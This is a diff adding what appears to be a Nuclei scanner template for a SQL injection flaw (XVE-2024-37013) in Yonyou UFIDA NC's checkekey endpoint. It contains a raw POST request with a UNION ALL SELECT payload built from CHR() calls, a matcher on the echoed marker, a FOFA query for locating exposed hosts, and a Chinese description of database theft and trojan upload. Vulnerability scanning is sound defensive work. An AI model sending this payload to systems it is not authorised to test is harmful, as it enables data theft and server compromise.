@@ -1,0 +1,35 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'invalid UFDateTime: qqpzqPgjzQFJhjkdJirXIpQewtOGNsAoFgUGSeAGZrWNkqjbpq'
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /portal/pt/office/checkekey?pageId=login HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+          Accept: */*
+          Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+          Accept-Encoding: gzip, deflate, br
+          Content-Type: application/x-www-form-urlencoded
+          Connection: close
+
+          user=1' UNION ALL SELECT NULL,CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(80)||CHR(103)||CHR(106)||CHR(122)||CHR(81)||CHR(70)||CHR(74)||CHR(104)||CHR(106)||CHR(107)||CHR(100)||CHR(74)||CHR(105)||CHR(114)||CHR(88)||CHR(73)||CHR(112)||CHR(81)||CHR(101)||CHR(119)||CHR(116)||CHR(79)||CHR(71)||CHR(78)||CHR(115)||CHR(65)||CHR(111)||CHR(70)||CHR(103)||CHR(85)||CHR(71)||CHR(83)||CHR(101)||CHR(65)||CHR(71)||CHR(90)||CHR(114)||CHR(87)||CHR(78)||CHR(107)||CHR(113)||CHR(106)||CHR(98)||CHR(112)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- twnX&ekey=1
+id: yongyouNC-checkekey-sql-XVE-2024-37013
+info:
+    author: Superhero
+    description: |-
+        fofa: app="用友-UFIDA-NC"
+        用友NC中checkekey存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 用友NC checkekey SQL 注入漏洞(XVE-2024-37013)
+    reference:
+        - https://mp.weixin.qq.com/s/pS_1n-1Qm7Xq47ShsSi2GA?token=1497378487&lang=zh_CN
+    severity: high
+    tags:
+        - 用友-ufida
+        - SHS
